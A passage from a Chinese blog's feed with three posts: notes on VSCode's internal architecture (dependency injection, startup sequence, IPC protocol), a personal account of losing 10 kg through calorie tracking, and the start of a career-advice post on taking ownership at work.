        <content type="html"><![CDATA[<p>之前有基于 VSCode 做二次开发的经验，约摸全投入持续了 5 个多月，开发了一个 <a href="https://isv.taobao.com/ide">Editor</a>，算是超级魔改吧，虽然保留了 VSCode 的样子，但是整个板块都有比较大的调整，新增了 Webview 预览面板、Devtool 调试工具、顶部控制区、插件市场等等。</p><p>当时由于需求的实现不需要了解全部的 VSCode 源码，但是也把大部分的源码啃得差不多了，包括：</p><ul><li>整个项目的工程部分，包括项目结构、软件构建、插件构建、持续集成等等</li><li>Workbench 部分的所有逻辑，整个窗体 UI 部分的实现</li><li>插件的实现，插件市场的逻辑，当时单独做了一个新的插件市场体系，插件的下载在自己的服务器管理</li><li>Language Service Protocol 的基本原理</li></ul><p>但是也有很多内容没有掌握，应该说没有太多兴趣和时间了解，包括：</p><ul><li>功能模块的测试和 UI 自动化测试</li><li>CommandRegistry 的内部机制，对应的是 IPCServer 的交互逻辑</li><li>IoC 实现的详细逻辑</li><li>SharedProcess 的基础逻辑</li><li>ExtensionHost 的运行机制</li></ul><p>这两天突然来了兴致，把之前没了解的部分源码通读了一遍，当然，仍然有一些疑惑，也仍然有一些不感兴趣的部分，后续空了会有更多的梳理，下面先贴上这两天的阅读笔记。其实我应该画图来帮助读者理解，不过以下主要是个人笔记，就懒得整理了，感兴趣的读者将就着看。</p><blockquote><p>阅读的版本是 <code>v1.37.0</code>，是目前 VSCode 源码仓库 master 分支最新的代码。</p></blockquote><h3 id="InstantiationService"><a href="#InstantiationService" class="headerlink" title="InstantiationService"></a>InstantiationService</h3><p>基本就是 IoC 的实现原理，以及 Service 的全局管理机制。</p><h4 id="服务注册为可被使用的-Decorator"><a href="#服务注册为可被使用的-Decorator" class="headerlink" title="服务注册为可被使用的 Decorator"></a>服务注册为可被使用的 Decorator</h4><p>提供了一个泛型装饰器 <code>createDecorator</code>，入参是 ServiceName 和 IService，后者是泛型入参：</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> createDecorator&lt;<span class="title class_">IService</span>&gt;(<span class="string">&#x27;service&#x27;</span>): <span class="title class_">ServiceIdentifier</span>&lt;<span class="title class_">IService</span>&gt; &#123;&#125;</span><br></pre></td></tr></table></figure><p>内部对 <code>service</code> 的实际处理是：</p><ul><li>记录，下次请求，若存在直接从缓存送出</li><li>记录的方式是：生成一个装饰器，装饰器的作用只判断入参是否是一个 <code>parameter</code>，意思是在类中 <code>method</code> 不允许被它装饰；并将装饰器的 toString 函数置为 <code>service</code> 这个 String</li></ul><p>返回的 <code>ServiceIdentifier</code>，格式为：</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">ServiceIdentifier</span>&lt;T&gt; &#123;</span><br><span class="line">    (...<span class="attr">args</span>: <span class="built_in">any</span>[]): <span class="built_in">void</span>;</span><br><span class="line">    <span class="attr">type</span>: T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="全局服务管理"><a href="#全局服务管理" class="headerlink" title="全局服务管理"></a>全局服务管理</h4><ul><li>注册一个管理服务的容器 <code>ServiceCollection</code>，它是一个 Map 类型，储存格式为：<code>&lt;ServiceIdentifier, instanceOrDescriptor&gt;[]</code></li><li>然后将服务容器挂在到全局 <code>instantiationService</code> 服务上，实际上是挂在 <code>instantiationService</code> 的私有成员变量 <code>_services</code> 上</li><li>同时也通过 <code>this._services.set(IInstantiationService, this)</code> 把自己装进了服务容器</li></ul><h4 id="服务的调用"><a href="#服务的调用" class="headerlink" title="服务的调用"></a>服务的调用</h4><ul><li>提供了一个 <code>Trace</code> 方法，记录了每次调用的耗时</li><li><strong>此处看的比较粗糙，InstantiationService.invokeFunction</strong>，通过分析 Service 的依赖，把所有的依赖项目都加载进来</li><li>其中考虑到了循环依赖的问题，直接报错，检测方式是递归查询深度超过 100</li><li>最终通过 <code>IdleValue</code> 类返回了一个 Proxy 对象，只有真正用到的时候才执行返回服务实例</li></ul><h3 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h3><p>看看 VSCode 在启动前和启动时都做了哪些事情。</p><h4 id="Code-Application-启动之前"><a href="#Code-Application-启动之前" class="headerlink" title="Code Application 启动之前"></a>Code Application 启动之前</h4><p>VSCode 的入口启动文件是 <code>./out/main.js</code>，对应源文件目录是 <code>./src/vs/main.ts</code>。</p><ul><li><code>vs/base/common/performance</code>，通过数组记录，每两项为一个数据单元，<code>[name, timestamp, ...]</code>，兼容 amd&#x2F;cmd</li><li><code>vs/base/node/languagePacks</code>，将大量 fs 操作 Promise 化后，提供一个查、写 <code>NLSConfiguration</code> 的方法，兼容 amd&#x2F;cmd</li><li><code>./bootstrap</code><ul><li><code>injectNodeModuleLookupPath</code>，注入一个 node_modules 的查询路径</li><li><code>enableASARSupport</code>，同上，注入 <code>.asar</code> 路径</li><li><code>uriFromPath</code>，一个兼容 win&#x2F;mac 的将 path 路径转换成磁盘 uri 的方法</li></ul></li><li>AMD 方式加载入口文件<ul><li><code>./bootstrap-amd</code><ul><li>AMD Loader 配置，<code>github:Microsoft/vscode-loader</code>,</li><li>将 Electron 的 fs 替换成 Node 原生的 fs</li></ul></li><li><code>vs/code/electron-main/main</code><ul><li><code>main</code><ul><li><code>setUnexpectedErrorHandler</code>，避免 Electron 底层报错，上层进行劫持</li><li><code>validatePaths</code> 入参验证</li></ul></li><li><code>startup -&gt; createServices,doStartup</code><ul><li>初始化一个日志服务，<code>bufferLogService</code></li><li>初始化两个重要的服务：<code>instantiationService, instanceEnvironment</code><ul><li>通过 <code>ServiceCollection</code> 记录所有注册的服务，它是一个单纯的 Map，记录的是 <code>&lt;ServiceIdentifier, instanceOrDescriptor&gt;[]</code></li><li>初始化的服务包括：<code>environmentService/logService/configurationService/lifecycleService/stateService/requestService/themeMainService/signService</code></li><li>将 <code>ServiceCollection</code> 挂载到 <code>instantiationService</code>，作为 <code>_services</code> 私有成员</li><li>同时将 <code>instantiationService</code> 挂在到 <code>_services</code> 私有成员上，相当于依然使用 <code>ServiceCollection</code> 管理</li></ul></li><li>完成 <code>environmentService/configurationService/stateService</code> 的初始化</li><li>初始化 <code>mainIpcServer</code>，并连接 <code>sharedIpcServer</code><ul><li>创建一个 <code>mainIpcServer</code>，入参是 <code>environmentService</code> 中记录的 <code>mainIPCHandle</code> 地址</li><li>如果创建失败，非 <code>EADDRINUSE</code> 错误，检查是否已经存在了一个 IPCHandler，如果存在则直接连接，连接失败会重试 1 次</li></ul></li><li>初始化 <strong>CodeApplication</strong>，将 mainIpcServer 和 instanceEnvironment 作为依赖服务挂载上去</li><li>调用 CodeApplication 的 <code>startup</code> 方法启动</li></ul></li><li>过程中如果有报错，则直接退出</li></ul></li></ul></li></ul><h4 id="Code-Application-启动"><a href="#Code-Application-启动" class="headerlink" title="Code Application 启动"></a>Code Application 启动</h4><p>入口文件是 <code>./src/vs/code/electron-main/app.ts</code>，对应的类为 <code>CodeApplication</code>，实例化的时候做了两件事情</p><ul><li>注册一些与 Electron 相关的事件，大多都是禁用一些底层、涉及安全或影响 VSCode 上层交互的事件</li><li>执行 <code>startup</code> 启动<ul><li>启动一个 <code>ElectronIPCServer</code><ul><li>通过 <code>ipcMain</code> 监听 <code>ipc:hello</code> 事件，通过 <code>webContents.id</code> 标记 Client 身份 </li><li>每次有一个新的 Client 进来都开始监听 <code>ipc:message</code> 和 <code>ipc:disconnect</code> 事件</li></ul></li><li>获取 MachineId（其实就是 Mac Address 的 hash 处理，降级方案是 uuid），启动一个 <code>SharedProcess</code><ul><li>创建一个不展示（show: false）的 <code>BrowserWindow</code>，启用了 <code>nodeIntegration</code></li><li>加载 <code>vs/code/electron-browser/sharedProcess/sharedProcess.html?config=$&#123;config&#125;</code>，通过 url 传参</li><li>新 BrowserWindow 的 ipcRenderer 与 ipcMain 进行三次握手<ul><li>ipcMain 将 <code>sharedIPCHandle</code> 的值传递给 <code>SharedProcess</code></li><li><code>SharedProcess</code> 创建一个 IPCServer</li><li>通过一个新的 CollectionService 生成服务容器，将各种服务通过新注册的 ipc channel 对接到 <code>IPCServer</code></li></ul></li><li><code>MainProcess</code> 连接到 <code>SharedProcess</code> 的 IPCServer</li></ul></li><li>将 Application 的附加 Service 作为 childService 添加到全局 <code>CollectionService</code> 容器</li><li><strong>这里没看太懂</strong>，如果存在 <code>driverHandle</code>，则新建一个 Dirver 的 IPCServer</li><li><strong>这里没看太懂</strong>，注入了一个 <code>ProxyAuth</code> 模块，不知道哪里会用到，内容很简单，就是一个输入账号密码的 <code>BrowserWindow</code> 弹窗</li><li>然后调用 <code>openFirstWindow</code> 打开 VSCode 主界面<ul><li>注册了主进程 IPC 服务：<code>launchService</code></li><li>注册了 Electron IPC 服务：<code>updateChannel/issueChannel/workspaceChannel/windowsChannel/menubarChannel/urlChannel/storageChannel</code> 等</li><li>通过 <code>windowsMainService(windowManager)</code> 打开界面</li></ul></li></ul></li></ul><h3 id="MainIpcServer"><a href="#MainIpcServer" class="headerlink" title="MainIpcServer"></a>MainIpcServer</h3><p>IPCServer 的大致原理，细节非常多，下面只是列了提纲，主要是实现了一套序列化和反序列化的协议，以及 <code>call</code> 调用和 <code>listen</code> 监听的两大逻辑。</p><h4 id="创建-Server"><a href="#创建-Server" class="headerlink" title="创建 Server"></a>创建 Server</h4><ul><li>建立 <code>net server</code>，通过 <code>mainIPCHandle</code> 文件句柄进行监听</li><li>基于 <code>netSocket</code> 封装了 <code>NodeSocket</code>，并绑定了通讯协议 <code>Protocol</code></li><li>创建失败，说明 socket 已经存在，直接连接 Server</li></ul><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">/-------------------------------|<span class="string">------\</span></span><br><span class="line"><span class="string"></span>|<span class="string">             HEADER            </span>|<span class="string">      </span>|</span><br><span class="line">|<span class="string">-------------------------------</span>|<span class="string"> DATA </span>|</span><br><span class="line">|<span class="string"> TYPE </span>|<span class="string"> ID </span>|<span class="string"> ACK </span>|<span class="string"> DATA_LENGTH </span>|<span class="string">      </span>|</span><br><span class="line">\-------------------------------|<span class="string">------/</span></span><br></pre></td></tr></table></figure><h4 id="连接-Server"><a href="#连接-Server" class="headerlink" title="连接 Server"></a>连接 Server</h4><ul><li>连接到 <code>net socket</code> 后，将 <code>netSocket</code> 同上包装两层，<code>NodeSocket + Protocol </code></li><li>指定 <code>ctx</code> 为 <code>main</code>，创建 <code>IPCClient</code>，<code>IPCClient</code> 既是一个  <code>client</code> 也是一个 <code>server</code>，共享一个 socket，通过 Protocol 协议进行通讯<ul><li>创建 <code>ChannelClient</code>，维护一个通讯的 handlers 管理器<ul><li>发起一个远程命令执行请求，将 <code>requestId</code> 和 <code>responseHandler</code> 写入管理器，通过 <code>protocal.send</code> 将请求发出</li><li>监听 <code>protocal.onMessage</code>，通过 <code>requestId</code> 匹配 <code>responseHandler</code> 处理结果</li></ul></li><li>创建 <code>ChannelServer</code>，指定 ctx 为 <code>main</code>（写入 ctx 的值）<ul><li>通过 <code>onRawMessage</code> 监听消息，解析 header 和 body 后，选择对应的 <code>channel</code>，执行 <code>channel.call</code>，执行结果通过 <code>protocal.send</code> 返回</li></ul></li></ul></li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>以上的分析过程，对读者的作用可能并不大，主要是逻辑过于冗长，防止自己读着读着开始迷失，把觉得比较核心的逻辑记录了下来。</p><p>如果读者想了解 VSCode 的全盘代码，有几处是必须全部理解的：</p><ol><li>InstantiationService 设计</li><li>IPC Protocol 设计</li><li>ExtensionHost 设计</li><li>Workbench Layout 设计</li><li>VSCode 的打包机制</li><li>Electron 的几乎所有 API</li></ol><p>后续空闲，我还会结合单测和自动化测试，熟悉 VSCode 整体架构，等有了内容再来分享。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂谈 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两个月减 10kg，聊聊这件事</title>
      <link href="/blog/2019/07/28/my-way-to-lose-weight/"/>
      <url>/blog/2019/07/28/my-way-to-lose-weight/</url>
      
        <content type="html"><![CDATA[<p>还记得刚进大学的时候也就 120 斤，那会儿还不到 18 岁，身体处于自然增长阶段，可能与生活不规律有点关系吧，四年下来，增重也有 25 斤，一米七四的个头，倒也显得还好，不胖不瘦。</p><p>毕业的随后四年里，依旧保持着极度不良好的生活作息和饮食习惯，体重一路飙升到 167 斤，肚子和脸蛋都开始圆了起来，因此也有了我常年使用的圆咕噜嘟的头像。</p><p>说起 <a href="https://img.alicdn.com/imgextra/i3/O1CN01tDYnfz23AWT1ag79p_!!6000000007215-2-tps-1200-1200.png">我的头像</a>，大概是三年多前，淘宝绘画兴趣小组的一次绘画课程中，我作为模特，同事亚城帮我绘制的，其实是个半成品，很多细节还没有处理完（那堂课只教这么多，囧），不过因为画得实在是贴切，就求了版权，拿了过来。当时的脸并没有画中那么胖，毕竟卡通人物的绘制都会适当加点夸张手法，<strong>但随着时间的推移，脸型越来越接近这张图像……</strong></p><h3 id="一个念头"><a href="#一个念头" class="headerlink" title="一个念头"></a>一个念头</h3><p>估计是因为大块的肥肉藏在了肚子和内脏里，165+ 的体重倒也没有显得特别胖，可带来的各种问题就多了，</p><ul><li>首先是身体上的问题，经常这儿有点疼，那儿有点痛，血压偏高，稍微运动心跳特别快，胡吃海喝，也特别容易油腻；</li><li>更麻烦的是心理上的问题，<strong>整个人就跟得了懒癌一样</strong>，周末不想动，能不走路的不走路，能不起身的不起身，由于这种心态，很多事情也会拖拖拉拉，感觉整个人都在与内心仅剩的那点斗志抗争。</li></ul><p>对于一个胖子而言，三天两头就会蹦出减肥的念头。但是，你应该能懂的，什么节食啊、健身啊，那都是三天打鱼两天晒网，哦，不，应该是三十天晒网。少吃东西带来的饥饿感，以及健身的痛苦感，让我无数次地轻松说服自己，“别减啦！”，每次说服都那么的管用……</p><p>每每看见身边有人减肥成功都赞叹不已，心中也会不禁感叹，“此人必是个狠角色！”，而把竖起的大拇指收回的那一瞬间，减肥的念头也便跟着一起散去了。毕竟，身上掉几十斤肉是我连想都不敢想的事情，那该是多大的痛苦呀！直到参加了上次团队安排的 <a href="/blog/2019/05/29/traveling-in-the-desert/">内蒙古沙漠之旅</a> ……</p><p>在沙漠徒步闲聊的时候，了解到身边有一个小伙伴，最近正在减肥，而且效果十分明显，已经掉了 30 斤了，我问他，你每天都去健身运动么？他说，一周也就一两回，不过吃草倒是吃了好几个月了。看着他在沙漠中只身穿行毫不喘气的身影，再看看一身装备的自己，却还像条狼狈的胖犬，耷拉着舌头，大口地呼吸着炙热的空气，心想，“要不咱也瘦一回试试？”</p><p>团建结束第二天，发了一条朋友圈，立下了一个 Flag，目标瘦身 10kg。与往常不一样的是，执行时间不是从明天开始，而是<strong>「今天」</strong>。</p><h3 id="两个月，10kg"><a href="#两个月，10kg" class="headerlink" title="两个月，10kg"></a>两个月，10kg</h3><p>那段时间的体重在 163~167 之间波动，权且就把 165 当做了起点，目标瞄准 145，回到离开校园时的水位。</p><p>减肥这件事情，倒不是一点经验都没有，曾几何时也是跟着身边的胖子们一起减过的，只不过没能坚持下去，这一次权且把自己的身体当作试验品，一点一点的尝试之前试过的、听过的、看过的一些方子，慢慢找到自己比较能接受的减肥方案。</p><h4 id="阻力"><a href="#阻力" class="headerlink" title="阻力"></a>阻力</h4><p>减肥的时候有三件事情绝不能在我身上发生，否则大概率坚持不下去，估计大部分胖子都是如此：</p><p><strong>1、不能饿着</strong></p><p>饥饿带来的痛苦感，加上美食带来的诱惑，绝对可以摧毁一个胖子减肥的决心，所以饿肯定是不行的，当然我也尝试过保持饥饿，结果就是一天下来整个人昏昏沉沉的，不仅办事效率下去了，体重的变化还不明显，最重要的是，这个法子没法在第二天坚持下去，因为实在是坚持不下去&#x3D;。 &#x3D;</p><p><strong>2、不能运动太多</strong></p><p>强运动是一件特别不靠谱的事情，内心触动的时候能够坚持一两天，等到意志略微消沉断了一天，那第二天也没便啥心思运动了，往后几天也因为第二天的不坚持直接破罐子破摔了……另外，如果不控制饮食，即便连续运动一两周效果也不会明显，最后剩下的也只有绝望和放弃了。</p><p><strong>3、不能准备太多</strong></p><p>前期减肥，重点还是要管住嘴，七分靠吃三分靠练，但是如果吃的东西准备的太复杂，或者准备需要花费的时间太多，那肯定也是没办法坚持下去的。试想一下，早上起床以后（甚至提前一天）还得跑去厨房准备各种食材，还得准备好中午吃的东西，打包带去公司，与我而言，那是万万做不到的。</p><p>上面三点，听起来似乎胖子们就没救了？下面就来说一说我是如何坚持下去的。</p><h4 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h4><p>首先需要了解一个简单的道理，要想让体重下去，每天摄入的能量，一定要小于每天消耗的能量，所以我们需要做的第一件事情就是找一个 APP 记录自己每天摄入的能量。为啥一定要找一个 APP 来记录呢？有这么一堆原因：</p><ul><li><strong>你不知道食物的能量有多少</strong>，比如酸奶，你知道一盒酸奶有多少能量么？你知道一根牛肉干的能量有多高么？你知道食物的碳水、蛋白质、脂肪等情况么？我估计你一点概念都没有，没关系，APP 知道；</li><li><strong>你记不住吃了多少</strong>，去一趟食堂，阿姨往你的盘子里打了一堆东西，你记得住自己吃了几块肥肉，几片火腿肠，几根青椒，几块萝卜，几口汤么？你记不住，记住了你也算不清楚，没关系，APP 算得清楚；</li><li><strong>你不知道食物的配比是否正确</strong>，早上吃了两个包子，中午吃了一块牛肉，晚上又吃了几盒水果，今天摄入的蛋白质够不够，碳水是不是偏多，你不知道，没关系，APP 可以告诉你。</li></ul><p>如果你自信自己可以算清楚每天的摄入量，我依然建议你使用 APP 记录，通过数据观察自己每天的摄入情况，对比体重的变化，可以更好、更快地找到适合自己的饮食结构。</p><h4 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h4><p>下面我来详细从数字上解释下，如何合理地控制饮食。</p><p>首先，你得知道每天不吃不喝不动也会存在消耗，这个消耗是人体的基本消耗，咱不搞什么复杂的算法，记住下面这个公式（统一使用千卡做单位，千卡又称大卡，亦称卡路里，下面简称卡）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">每日的基本消耗（卡）~= 你的体重（斤） * <span class="number">12</span></span><br></pre></td></tr></table></figure><p>比如我减肥前的基本消耗大概为 1980 卡，这个算法比较粗暴，不算很准确，主要我觉得没必要算那么清楚，知道大致的就行了，如果你有运动的话，消耗量会大一点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如走五六千步或者跑两三公里</span></span><br><span class="line">运动（卡）~= 体重（斤）* <span class="number">14</span></span><br></pre></td></tr></table></figure><p>运动消耗大概 2310 卡，这个也不准确，不过没关系，大致了解这个数值就行了，搞这么简单是为了好记。基本所有的食品包装袋上都会标注能量表，大部分会采用千焦耳做单位，它与卡路里的换算公式为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> 卡 = <span class="number">4.18</span> 千焦耳 <span class="comment">// 简单一点，4 倍关系</span></span><br></pre></td></tr></table></figure><p>以后看到食品包装袋上标注的焦耳数值，除以 4，大概就是摄入的卡路里能量值。如果我想要减肥，每天摄入的能量就必须保证低于 1980 卡，你知道这个能量大概是多少么？</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> 个肉包 = <span class="number">210</span> 卡</span><br><span class="line"><span class="number">1</span> 碗米饭 = <span class="number">232</span> 卡</span><br><span class="line"><span class="number">1</span> 份五花肉 = <span class="number">426</span> 卡</span><br><span class="line"><span class="number">1</span> 盒酸奶 = <span class="number">180</span> 卡</span><br><span class="line"><span class="number">1</span> 个肉松面包 = <span class="number">391</span> 卡</span><br></pre></td></tr></table></figure><p>随便早餐一盒酸奶+一个包子，午餐一碗米饭+两个菜，晚饭一碗米饭+一个菜，就会达到 2100+ 卡了；更不用说，还会吃几盒水果，外加一点零食，还有夜宵，或者偶尔吃个火锅、烧烤等等，随随便便就 2500+ 甚至三四千卡。</p><p>看到上面这些数字，是不是已经找到自己持续长肉的源头啦？</p><h4 id="定制"><a href="#定制" class="headerlink" title="定制"></a>定制</h4><p>初期减肥时，一定要与米饭、肉类、油水等食物 Say Bye，随便找个 APP 查询下就会知道，碳水和脂肪类的能量都太高了，而且碳水还有个问题，能量高且容易消耗，简单来说，你吃两碗米饭，稍微动一动就又饿了。</p><p>当然，食堂基本也不要想着再去了，不管是自助餐厅还是阿姨给你打菜的那种食堂，都很难计算卡路里，各种食物掺杂在一起，加上还不知道菜里放了多少油，随便一顿下去，可能一整天的卡路里预算就花光了。</p><p>我的计划是每天吃 5 顿，早中晚三餐不能少，上午和下午各加餐一顿，基本上只补充碳水和蛋白质，不碰脂肪类食物。三个时间段的能量配比大概是 4:4:2，如果当天有运动的话，大概是 3:4:3，总摄入量一般建议是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">每日总摄入能量（卡） = 基本消耗（卡） - <span class="number">500</span>~<span class="number">800</span>（卡）</span><br></pre></td></tr></table></figure><p>初期我是直接减 1000 卡，也就是总摄入量在 1000 卡左右（基本消耗约 1980 卡），属于有点猛烈的，正常配比大概是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">上午（早餐 + 上午加餐）：<span class="number">400</span> 卡</span><br><span class="line">中午（午餐 + 中午加餐）：<span class="number">400</span> 卡</span><br><span class="line">晚上（晚餐 + 晚上加餐）：<span class="number">200</span> 卡</span><br></pre></td></tr></table></figure><p>晚上如果不是特别饿的话，不会加餐，如果当天有运动，总摄入量可能会调整到 1200~1400 卡。保持这个比例，然后不断的挖掘和适应自己最喜欢的食物和配餐。</p><p><strong>上午餐</strong></p><p>我的早餐比较固定，一般就是 <code>一大碗脱脂牛奶 + 麦片</code>，不到 300 卡，或者吃 <code>一个玉米 + 一个鸡蛋白</code>。每次加餐补充 200 卡，大概就是 <code>一个苹果 + 一个香蕉</code> 或者 <code>一个玉米 + 一个鸡蛋白</code> 的能量。</p><p>前两个月用的脱脂牛奶，后面用的鲜牛奶（主要是附近超市好像不提供脱脂牛奶了），牛奶和麦片随便就能买到，而且容易做，基本两分钟就能搞定（凉牛奶微波炉加热一分半），三分钟能吃完，一点都不耽误时间。偶尔起的早，会煮玉米和鸡蛋，或者去公司的超市购买。</p><p>麦片我不建议买燕麦片，太难吃，我买的是水果麦片。你会发现，我的配餐都是很容易凑齐，而且也是我喜欢吃的。一定得找自己喜欢吃的，否则，你想想，你如何坚持几个月？</p><p><strong>中午餐</strong></p><p>午餐基本就是吃沙拉，前一个月一点肉都没有，后来实在是坚持不下去了，加了点鸡胸肉、牛肉、鱼肉之类蛋白含量比较高的食物。再后来，我发现午餐超标吃一点「非健康」食物似乎也不怎么影响体重的下降，于是就改成了帕尼尼、吐司等等，不过我还是建议你先多吃水果蔬菜，等体重有了一点变化后，再加点料。</p><p>沙拉很多人都不爱吃，我也一样，所以我会尽量吃自己喜欢的，比如海带多一点的，或者小番茄多一点的沙拉。能够坚持吃一个月纯蔬菜沙拉的，都是牛人，比如我，哈哈，我自己都佩服我自己 ；）</p><p>下午我会去水果店买点自己喜欢的水果，或者继续补充点蛋白，吃些牛肉干或者鸡蛋白。上次从内蒙回来，我带了两袋子牛肉干，一根牛肉干大拇指那么粗，比筷子还长，大概也就 50g，能量大概 200+ 卡的样子，比较适合作为加餐食物。在家，吃牛肉干比较多；在公司，去水果店和甘其食比较多，还可以多走几步路，来回也有一两千步。</p><p><strong>晚上餐</strong></p><p>晚上就很简单了，基本就是黄瓜、小番茄、水果之类的，多吃一点问题也不大，基本就是保证 200 卡左右的摄入，如果有运动的话，会适当补充蛋白质。</p><p>我还挺喜欢吃鸡蛋番茄汤的，有一段时间，我会特意早早回家，给自己做一碗鸡蛋番茄汤，不放油。一般汤水放的挺多，一大碗下去，肚子都会很撑…</p><h4 id="自由日"><a href="#自由日" class="headerlink" title="自由日"></a>自由日</h4><p>如果一直保持低能量摄入，一段时间后，身体可能会适应这种环境，慢慢地，基础代谢会降低，每日的基础能耗也会降低，如果想继续维持体重的下降，便只能继续降低摄入量，长期如此对身体肯定是有害的，<strong>所以身体需要每周有一天或者至少有一餐是正常甚至过量摄入的，这是一顿欺骗餐，欺骗身体还有正常的摄入，基础消耗请不要降低。</strong></p><p>我一般把周六当做自由日，这一天中午，我会自己做一顿饭，下重油，敞开了吃，或者直接下馆子，整点烧烤、火锅之类。</p><p>这里需要注意的是，一般自由日过去后，体重会回升 2<del>5 斤，这是正常的，在下一周的周二、周三就会回落到之前水平。保持如此，前一个多月，我每周会减重 2</del>3 斤。</p><p>掉肉十五六斤的时候，我放宽了自由日的定义，每周会有 3<del>4 次在外面胡吃海喝，当然，结果就是花半个月才能掉 2</del>3 斤。虽然是胡吃海喝，但是吃的时候还是挺注意的，首先，我不吃米饭，然后就是只摄入高蛋白食物，尽量不碰油脂。</p><p>几个月下来，我戒掉了碳水。以前只要肚子饿，首先想到的是辛辣的美食，然后心中就会冒出两个字「下饭」+ 流口水，现在已经没啥感觉了。</p><h4 id="运动"><a href="#运动" class="headerlink" title="运动"></a>运动</h4><p>刚开始没怎么运动，等到身体从 16x 突破到 15x 的时候，热情高涨，血脉澎湃，每周都会破天荒地有 1<del>3 次的室内跑步，每次运动大概 15</del>30 min，保证全身湿透才会停下。要知道以前三个月能跑一次都是很奢侈的事情。</p><p>两个多月下来，体重下降 10kg，小米体脂秤的综合分从 60 分变成了如今的 81 分；之前有轻微的脂肪肝，现在应该没有了；肚子上的肉也不明显了，甚至还出现了一点点肌肉的痕迹；三下巴现在也消失了，现在只剩下一点点双下巴的痕迹。</p><p>其实结实的胖子减完肥，效果并没有那么明显，比如我，看起来也就是脸小了一点。只有自己能感觉到，整个身体轻松了很多，人也健康了不少。</p><p>由于 20 斤的目标已经达成，为了保持这种身材以及瘦身的心态，我决定，将当初的目标调整为 15kg，也就是说未来 2 个月的时间，我还会瘦 5kg，但是后续的减肥，我会尽量通过运动来控制，五分靠练五分靠吃，甚至六分靠练四分靠吃，今年的总体目标是 <strong>不限制自己的嘴巴，找到运动（拳击也好、游泳也好、撸铁也好）的乐趣，然后继续保持体重的稳定。</strong></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>以上，啰啰嗦嗦说了一堆了，大概就是我最近两个月的所有减肥心得了。</p><p>后续，我应该会通过同样的方式 <code>目标 - 定制 - 行动 - 调整</code>，从运动而非饮食的角度让自己变得更加健康，这个阶段的摸索周期可能会更长一点，不过最近好像已经有了努力的方向，等我有了更多靠谱的经验，再跟大家分享吧~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 减肥心得 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>破局 - 纯粹的执行者</title>
      <link href="/blog/2019/07/18/to-be-yourself-in-company/"/>
      <url>/blog/2019/07/18/to-be-yourself-in-company/</url>
      
        <content type="html"><![CDATA[<p>不管是大公司还是小公司，你都可以看见这类主管：他不断地从外面接活儿进来，然后排好时间、分好任务指派给你。在这样的主管下，你的角色更像是一个单纯的执行者，稍微好一点的情况是，他会给你安排大块的事情，糟糕一点的情况是，他指派给你的任务特别离散，不聚焦，让你东搞一下西搞一下。</p><p><img src="/../blogimgs/2019/07/18/to_be_your_self_in_company.png" alt="破局"></p><p>明白自己处境的人，会忧虑，不明白的人，还觉得自己很充实。如果你恰好有这样的感觉，我可以告诉你几个破局的思路。</p><h4 id="1、不要把自己当成执行者"><a href="#1、不要把自己当成执行者" class="headerlink" title="1、不要把自己当成执行者"></a>1、不要把自己当成执行者</h4><p>很大一部分原因还是因为，你自己把自己当成了执行者，你不愿意去分析需求或者不懂得如何去分析需求，你没有一个长期的聚焦的目标，结果就是你的主管会帮你做好这一切，他会根据团队今年的目标分析出几件核心的事情，然后将事情细化之后分派给团队的同学，如果你有一定的规划能力，他可能会把一整件事情交给你，如果没有，那大概率就是东边人手不足把你推过去，西边时间紧急把你拉回来。</p><p>提升自己的主观能动性，主动去 Owner 一块事情，给出详细的规划和落地方案，不断找主管和合作伙伴对焦，自然而然你的规划力就显露出来了。不要把自己当成执行者，而是 Owner。</p><h4 id="2、帮助你的主管认识到自己的问题"><a href="#2、帮助你的主管认识到自己的问题" class="headerlink" title="2、帮助你的主管认识到自己的问题"></a>2、帮助你的主管认识到自己的问题</h4><p>很显然，把下属当做执行者也是主管的问题，任何一个人都是可培养的，否则当初也不会把你招进来，你可以找主管沟通，告诉他你最近处于什么状态，其实很可能在给你委派零散需求这件事情上，他并没有意识到会不利于你的成长，你需要吐露自己的心声，告诉主管你想得到什么，而现在的工作方式可能让你拿不到想要的结果。</p><p>主管也有能力强和能力弱的，对于没有太多管理经验的主管，他做事可能依然是当初个人作战时的风格，关注的是事情，没有考虑到人的成长。</p><h4 id="3、搞清楚团队的目标和个人的目标"><a href="#3、搞清楚团队的目标和个人的目标" class="headerlink" title="3、搞清楚团队的目标和个人的目标"></a>3、搞清楚团队的目标和个人的目标</h4><p>一个没有目标的团队是难以凝聚到一起的，在定义个人目标之前，你首先需要知道团队的目标是什么，说得直白一点，你需要知道主管今年的目标是什么，想一想自己承担了主管目标的哪个部分，偏离的太多肯定是不行的，个人的核心目标一定要与团队目标进行对焦。</p><p>目标一定是有挑战的，也是能拿到结果的，当你在执行任务的时候，可以去想一想，我手头的事情是否是完成个人目标的必做事项，如果不是，你就得想办法做取舍，至少得排个优先级。</p><h4 id="4、敢于-Say-No"><a href="#4、敢于-Say-No" class="headerlink" title="4、敢于 Say No"></a>4、敢于 Say 